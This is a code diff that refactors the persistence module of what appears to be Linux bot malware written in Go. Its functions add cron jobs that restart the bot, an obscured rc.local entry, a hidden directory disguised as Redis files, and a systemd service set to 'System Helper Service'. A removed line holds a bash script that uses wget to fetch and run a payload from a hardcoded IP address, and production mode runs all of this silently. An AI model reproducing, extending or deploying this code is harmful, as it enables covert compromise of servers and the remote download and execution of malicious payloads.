@@ -14,12 +14,13 @@ import (
 // ============================================================================
 
 // carbanak creates a cron job that runs every minute to check/restart the bot.
-// The cron job executes a hidden shell script that ensures persistence.
+// The cron job executes the persistence shell script inside hiddenDir.
 // In debug mode: only logs what would happen, does not execute.
 // Parameters:
 //   - hiddenDir: Directory containing the persistence script
 func carbanak(hiddenDir string) {
-	cronJob := fmt.Sprintf("* * * * * bash %s/.redis_script.sh > /dev/null 2>&1", hiddenDir)
+	scriptPath := filepath.Join(hiddenDir, persistScriptName)
+	cronJob := fmt.Sprintf("%s bash %s > /dev/null 2>&1", persistCronSchedule, scriptPath)
 
 	if debugMode {
 		deoxys("carbanak: [DEBUG] Would set up cron persistence in %s", hiddenDir)
@@ -47,7 +48,7 @@ func lazarus() {
 	}
 
 	procName := filepath.Base(exe)
-	cronJob := fmt.Sprintf("* * * * * pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", procName, exe)
+	cronJob := fmt.Sprintf("%s pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", persistCronSchedule, procName, exe)
 
 	if debugMode {
 		deoxys("lazarus: [DEBUG] Would set up cron persistence")
@@ -71,17 +72,15 @@ func lazarus() {
 	cmd.Run()
 }
 
-// fin7 adds the bot executable to /etc/rc.local for startup persistence.
+// fin7 adds the bot executable to rc.local for startup persistence.
 // Only adds entry if rc.local exists and doesn't already contain our path.
 // Uses a random suffix to make the entry less obvious.
 // In debug mode: only logs what would happen, does not execute.
 func fin7() {
-	rc := "/etc/rc.local"
-
 	if debugMode {
 		deoxys("fin7: [DEBUG] Would set up rc.local persistence")
-		if _, err := os.Stat(rc); err != nil {
-			deoxys("fin7: [DEBUG] %s does not exist, would skip", rc)
+		if _, err := os.Stat(persistRcLocal); err != nil {
+			deoxys("fin7: [DEBUG] %s does not exist, would skip", persistRcLocal)
 			return
 		}
 		exe, err := os.Executable()
@@ -89,9 +88,9 @@ func fin7() {
 			deoxys("fin7: [DEBUG] Failed to get executable path: %v", err)
 			return
 		}
-		b, err := os.ReadFile(rc)
+		b, err := os.ReadFile(persistRcLocal)
 		if err != nil {
-			deoxys("fin7: [DEBUG] Failed to read %s: %v", rc, err)
+			deoxys("fin7: [DEBUG] Failed to read %s: %v", persistRcLocal, err)
 			return
 		}
 		if strings.Contains(string(b), exe) {
@@ -105,14 +104,14 @@ func fin7() {
 	}
 
 	// Production mode - execute silently
-	if _, err := os.Stat(rc); err != nil {
+	if _, err := os.Stat(persistRcLocal); err != nil {
 		return
 	}
 	exe, err := os.Executable()
 	if err != nil {
 		return
 	}
-	b, err := os.ReadFile(rc)
+	b, err := os.ReadFile(persistRcLocal)
 	if err != nil {
 		return
 	}
@@ -120,11 +119,11 @@ func fin7() {
 		return
 	}
 	line := exe + " # " + kimsuky() + "\n"
-	sandworm(rc, line, 0700)
+	sandworm(persistRcLocal, line, 0700)
 }
 
 // dragonfly sets up comprehensive persistence using multiple methods:
-//  1. Creates hidden directory /var/lib/.redis_helper
+//  1. Creates hidden directory (persistHiddenDir)
 //  2. Writes a shell script that downloads/runs the bot
 //  3. Creates a systemd service for automatic startup
 //  4. Installs a cron job as backup persistence
@@ -132,36 +131,31 @@ func fin7() {
 // All files are disguised as Redis-related system files.
 // In debug mode: only logs what would happen, does not execute.
 func dragonfly() {
-	hiddenDir := "/var/lib/.redis_helper"
-	scriptPath := filepath.Join(hiddenDir, ".redis_script.sh")
-	programPath := filepath.Join(hiddenDir, ".redis_process")
-	url := "http://185.247.224.107/mods/installer"
-	servicePath := "/etc/systemd/system/redis-helper.service"
+	scriptPath := filepath.Join(persistHiddenDir, persistScriptName)
+	programPath := filepath.Join(persistHiddenDir, persistBinaryName)
 
 	if debugMode {
 		deoxys("dragonfly: [DEBUG] Would set up comprehensive persistence")
-		deoxys("dragonfly: [DEBUG] Would create hidden directory: %s", hiddenDir)
+		deoxys("dragonfly: [DEBUG] Would create hidden directory: %s", persistHiddenDir)
 		deoxys("dragonfly: [DEBUG] Would write persistence script to: %s", scriptPath)
-		deoxys("dragonfly: [DEBUG] Script would download from: %s", url)
+		deoxys("dragonfly: [DEBUG] Script would download from: %s", persistPayloadURL)
 		deoxys("dragonfly: [DEBUG] Would write program to: %s", programPath)
-		deoxys("dragonfly: [DEBUG] Would write systemd service to: %s", servicePath)
-		deoxys("dragonfly: [DEBUG] Would enable systemd service: redis-helper.service")
+		deoxys("dragonfly: [DEBUG] Would write systemd service to: %s", persistServicePath)
+		deoxys("dragonfly: [DEBUG] Would enable systemd service: %s", persistServiceName)
 		deoxys("dragonfly: [DEBUG] Would set up cron backup via carbanak()")
 		deoxys("dragonfly: [DEBUG] Skipping actual execution (debug mode)")
 		return
 	}
 
 	// Production mode - execute silently
-	os.MkdirAll(hiddenDir, 0755)
+	os.MkdirAll(persistHiddenDir, 0755)
 
-	scriptContent := fmt.Sprintf("#!/bin/bash\nURL=\"%s\"\nPROGRAM_PATH=\"%s\"\nif [ ! -f \"$PROGRAM_PATH\" ]; then\nwget -O $PROGRAM_PATH $URL\nchmod +x $PROGRAM_PATH\nfi\nif ! pgrep -x \".redis_process\" > /dev/null; then\n$PROGRAM_PATH &\nfi\n", url, programPath)
+	scriptContent := fmt.Sprintf(persistScriptTemplate, persistPayloadURL, programPath, persistBinaryName)
 	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
+	os.WriteFile(persistServicePath, []byte(persistServiceContent), 0644)
 
-	serviceContent := "[Unit]\nDescription=System Helper Service\nAfter=network.target\n[Service]\nExecStart=/var/lib/.redis_helper/.redis_script.sh\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\n"
-	os.WriteFile(servicePath, []byte(serviceContent), 0644)
-
-	cmd := exec.Command("systemctl", "enable", "--now", "redis-helper.service")
+	cmd := exec.Command("systemctl", "enable", "--now", persistServiceName)
 	cmd.Run()
 
-	carbanak(hiddenDir)
+	carbanak(persistHiddenDir)
 }
